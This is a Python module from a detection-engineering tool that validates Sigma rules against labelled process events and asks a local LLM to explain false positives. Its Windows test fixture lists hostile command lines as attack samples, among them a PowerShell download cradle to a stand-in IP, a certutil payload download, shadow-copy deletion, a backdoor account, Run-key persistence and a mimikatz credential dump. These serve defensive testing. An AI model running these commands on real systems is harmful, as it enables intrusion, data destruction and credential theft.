"""Agent B: statistical validation of Sigma rules on labelled datasets.

Rules are evaluated through app.services.detection.sigma_runtime, the same normalization, matcher
and safe-process policy the Detection Engine uses at runtime, so validated metrics describe exactly
what will run. Ground truth comes from labelled datasets (manager/knowledge/validation), never from a
LARP detector flag such as process_info.is_suspicious.
"""
import hashlib
import json
import logging
import re
from functools import lru_cache
from pathlib import Path
from typing import Dict, Any, Optional, List, Tuple

import httpx
import pandas as pd
import yaml

from app.services.ai.ai_client import DEFAULT_MODEL, OLLAMA_URL
from app.services.detection import sigma_runtime

logger = logging.getLogger("larp.ai.validation")

VALIDATION_EXPLANATION_MODEL = DEFAULT_MODEL
DATASET_DIR = Path(__file__).resolve().parents[3] / "knowledge" / "validation"
LINUX_DATASET = "linux_process_v1.jsonl"
MIN_ATTACK = 5
MIN_BENIGN = 10

# Legacy Windows fixture, kept for Windows rules and labelled for what it is: synthetic.
WINDOWS_FIXTURE = [
    ("explorer.exe", "C:\\Windows\\Explorer.EXE", "userinit.exe", 0),
    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "services.exe", 0),
    ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "chrome.exe", 0),
    ("python.exe", "python.exe C:\\larp\\agent\\win_agent_minimal.py", "cmd.exe", 0),
    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "taskeng.exe", 0),
    ("cmd.exe", "cmd.exe /c echo %PATH%", "explorer.exe", 0),
    ("conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "cmd.exe", 0),
    ("code.exe", "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "explorer.exe", 0),
    ("nginx.exe", "nginx -g \"daemon off;\"", "systemd", 0),
    ("bash", "/bin/bash /usr/local/bin/healthcheck.sh", "cron", 0),
    ("powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "winword.exe", 1),
    ("powershell.exe", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.4/rev.ps1')", "excel.exe", 1),
    ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "cmd.exe", 1),
    ("wmic.exe", "wmic shadowcopy delete /nointeractive", "cmd.exe", 1),
    ("certutil.exe", "certutil.exe -urlcache -split -f http://malicious.example/payload.exe payload.exe", "cmd.exe", 1),
    ("net.exe", "net user backdoor P@ssw0rd123! /add", "powershell.exe", 1),
    ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "cmd.exe", 1),
    ("mimikatz.exe", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "cmd.exe", 1),
    ("rundll32.exe", "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "cmd.exe", 1),
    ("whoami.exe", "whoami /priv", "cmd.exe", 1),
]


def _record(event_id, source, scenario, label, process, parent):
    raw = {**process, "parent_name": (parent or {}).get("name"), "parent_exe": (parent or {}).get("exe"),
           "parent_cmdline": (parent or {}).get("cmdline")}
    return {"event_id": event_id, "source": source, "scenario": scenario, "label": int(label),
            "event": sigma_runtime.normalize_event(raw)}


@lru_cache(maxsize=4)
def _load_jsonl(name: str) -> Tuple[Tuple[dict, ...], str]:
    path = DATASET_DIR / name
    text = path.read_text(encoding="utf-8")
    records = []
    for line in text.splitlines():
        row = json.loads(line)
        records.append(_record(row["event_id"], row["source"], row["scenario"],
                               row["ground_truth_label"] == "attack", row["process"], row.get("parent")))
    return tuple(records), hashlib.sha256(text.encode()).hexdigest()[:16]


def labelled_dataset(rule: dict) -> Tuple[List[dict], Dict[str, Any]]:
    """Labelled records for the rule's platform plus a description of where they came from."""
    product = str((rule.get("logsource") or {}).get("product") or "").lower()
    records, parts = [], []
    if product in ("", "linux"):
        linux, digest = _load_jsonl(LINUX_DATASET)
        records.extend(linux)
        parts.append({"name": LINUX_DATASET, "sha256": digest})
    if product in ("", "windows"):
        records.extend(_record(f"win-fixture-{n:02d}", "synthetic_windows_fixture", "legacy_fixture", label,
                               {"name": name, "exe": name, "cmdline": cmd}, {"name": parent, "exe": parent})
                       for n, (name, cmd, parent, label) in enumerate(WINDOWS_FIXTURE, start=1))
        parts.append({"name": "windows_fixture_v1", "sha256": None})
    return records, {"datasets": parts, "product": product or "any"}


def records_from_dataframe(df: pd.DataFrame, ground_truth: pd.Series) -> List[dict]:
    """Caller-supplied evaluation data (legacy DataFrame shape: process/cmdline/parent columns)."""
    rows = []
    for position, (_, row) in enumerate(df.iterrows()):
        data = {k: v for k, v in row.to_dict().items() if v is not None and v == v}
        process = {"name": data.get("process") or data.get("name"), "exe": data.get("exe"),
                   "cmdline": data.get("cmdline"), "pid": data.get("pid"), "ppid": data.get("ppid")}
        parent = {"name": data.get("parent"), "exe": data.get("parent_exe"), "cmdline": data.get("parent_cmdline")}
        rows.append(_record(str(data.get("event_id", position)), "caller_supplied", data.get("scenario", ""),
                            int(ground_truth.iloc[position]), process, parent))
    return rows


def summarize(records: List[dict], meta: Dict[str, Any]) -> Dict[str, Any]:
    by_source: Dict[str, Dict[str, int]] = {}
    for r in records:
        slot = by_source.setdefault(r["source"], {"attack": 0, "benign": 0})
        slot["attack" if r["label"] else "benign"] += 1
    attack = sum(r["label"] for r in records)
    return {**meta, "total": len(records), "attack": attack, "benign": len(records) - attack,
            "by_source": by_source, "label_source": "nhãn ground truth độc lập (không dùng is_suspicious)"}


def _sample(record: dict) -> Dict[str, Any]:
    e = record["event"]
    return {"event_id": record["event_id"], "scenario": record["scenario"], "source": record["source"],
            "process": e.get("name"), "exe": e.get("exe"), "cmdline": e.get("cmdline"),
            "parent": e.get("parent_name"), "parent_cmdline": e.get("parent_cmdline")}


def _failure(verdict, reason, **extra):
    return {"passed": False, "verdict": verdict, "reason": reason, "fpr": None, "precision": None,
            "recall": None, "f1": None, "confusion": None, "fp_samples": [], "fn_samples": [], **extra}


class ValidationService:
    """Agent B: deterministic statistics on labelled data; the LLM only explains false positives."""

    def __init__(self, ollama_url: str = OLLAMA_URL, model: str = VALIDATION_EXPLANATION_MODEL):
        self.ollama_url = ollama_url
        self.model = model

    async def validate_rule(
        self,
        rule_yaml: str,
        historical_logs_df: Optional[pd.DataFrame] = None,
        ground_truth: Optional[pd.Series] = None,
        fpr_threshold: float = 0.05,
        precision_threshold: float = 0.95,
        db_session=None,  # kept for compatibility; validation no longer reads detector-labelled DB rows
    ) -> Dict[str, Any]:
        try:
            rule = yaml.safe_load(rule_yaml)
        except yaml.YAMLError as e:
            return _failure("FAILED", f"YAML syntax error: {e.__class__.__name__}")
        if not isinstance(rule, dict) or not isinstance(rule.get("detection"), dict):
            return _failure("FAILED", "Missing or invalid 'detection' block in Sigma rule")
        supported, support_reason = sigma_runtime.check_support(rule)
        if not supported:
            return _failure("UNSUPPORTED_BY_ENGINE", support_reason, engine_supported=False)

        if historical_logs_df is not None and ground_truth is not None:
            records = records_from_dataframe(historical_logs_df, ground_truth)
            meta = {"datasets": [{"name": "caller_supplied", "sha256": None}], "product": "caller"}
        else:
            records, meta = labelled_dataset(rule)
        dataset = summarize(records, meta)
        if dataset["attack"] < MIN_ATTACK or dataset["benign"] < MIN_BENIGN:
            if historical_logs_df is None:
                return _failure("INCONCLUSIVE", f"Chưa đủ dữ liệu: cần ít nhất {MIN_ATTACK} mẫu tấn công và "
                                f"{MIN_BENIGN} mẫu benign có nhãn cho nền tảng này.", dataset=dataset)

        mitre = [str(t).split(".", 1)[-1].upper() for t in rule.get("tags") or [] if str(t).lower().startswith("attack.t")]
        matched = {id(e) for e in sigma_runtime.matching_events(
            rule, [r["event"] for r in records], mitre=mitre, name=str(rule.get("title") or ""))}
        tp = fp = fn = tn = 0
        fp_samples, fn_samples = [], []
        for r in records:
            hit = id(r["event"]) in matched
            if hit and r["label"]:
                tp += 1
            elif hit:
                fp += 1
                fp_samples.append(_sample(r))
            elif r["label"]:
                fn += 1
                fn_samples.append(_sample(r))
            else:
                tn += 1
        benign, attack = fp + tn, tp + fn
        fpr = fp / benign if benign else 0.0
        precision = tp / (tp + fp) if (tp + fp) else None
        recall = tp / attack if attack else None
        f1 = (2 * precision * recall / (precision + recall)) if precision and recall else 0.0

        if tp == 0 and fp == 0:
            verdict, passed = "INCONCLUSIVE", False
            reason = ("Không đủ dữ liệu kiểm định: rule không khớp mẫu nào trong tập có nhãn "
                      f"({attack} mẫu tấn công, {benign} mẫu benign).")
        else:
            passed = tp > 0 and fpr <= fpr_threshold and (precision or 0) >= precision_threshold
            verdict = "PASSED" if passed else "FAILED"
            if passed:
                reason = f"Đạt: FPR {fpr:.2%}, Precision {precision:.2%}, Recall {recall:.2%} trên {len(records)} mẫu có nhãn."
            else:
                reasons = []
                if tp == 0:
                    reasons.append("không phát hiện mẫu tấn công nào")
                if fpr > fpr_threshold:
                    reasons.append(f"FPR {fpr:.2%} vượt ngưỡng {fpr_threshold:.2%}")
                if precision is not None and precision < precision_threshold:
                    reasons.append(f"Precision {precision:.2%} dưới ngưỡng {precision_threshold:.2%}")
                reason = "Không đạt: " + "; ".join(reasons)

        result: Dict[str, Any] = {
            "passed": passed, "verdict": verdict, "reason": reason, "engine_supported": True,
            # Rates are only reported for a rule that produced at least one alert on the labelled set.
            "fpr": None if verdict == "INCONCLUSIVE" else round(fpr, 4),
            "precision": None if precision is None or verdict == "INCONCLUSIVE" else round(precision, 4),
            "recall": None if recall is None or verdict == "INCONCLUSIVE" else round(recall, 4),
            "f1": None if verdict == "INCONCLUSIVE" else round(f1, 4),
            "confusion": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
            "fp_samples": fp_samples[:20], "fn_samples": fn_samples[:20],
            "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
            "dataset": dataset,
        }
        if fpr > fpr_threshold and fp_samples:
            try:
                explanation = await self._generate_llm_fp_explanation(rule_yaml, fp_samples[:5], fpr)
                if explanation:
                    result["llm_explanation"] = explanation
            except Exception as e:
                logger.warning(f"Failed to generate LLM explanation for high FPR: {e}")
        return result

    async def _generate_llm_fp_explanation(
        self, rule_yaml: str, fp_samples: List[Dict[str, Any]], fpr: float
    ) -> Optional[str]:
        """
        Optional Agent B -> Agent A: Call LLM to explain why rule fires FP and suggest exclusions.
        """
        prompt = (
            f"You are a Senior SOC Detection Engineer. The following Sigma rule was tested on historical logs "
            f"and produced an unacceptably high False Positive Rate (FPR: {fpr:.2%}).\n\n"
            f"Sigma Rule:\n```yaml\n{rule_yaml}\n```\n\n"
            f"False Positive Samples from benign environment:\n{fp_samples}\n\n"
            f"Provide a concise analysis (max 3 sentences) explaining why this rule generated false positives, "
            f"and provide a concrete YAML filter block to exclude benign activity."
        )

        payload = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": "You are an expert EDR detection engineer. Be concise and precise."},
                {"role": "user", "content": prompt}
            ],
            "stream": False,
            "options": {"temperature": 0.2, "num_predict": 400}
        }

        async with httpx.AsyncClient(timeout=15.0) as client:
            resp = await client.post(f"{self.ollama_url}/api/chat", json=payload)
            if resp.status_code == 200:
                data = resp.json()
                content = data.get("message", {}).get("content", "")
                # Strip think tags if present
                clean = re.sub(r"<think>.*?</think>", "", content, flags=re.DOTALL).strip()
                return clean or content.strip()
        return None


validation_service = ValidationService()
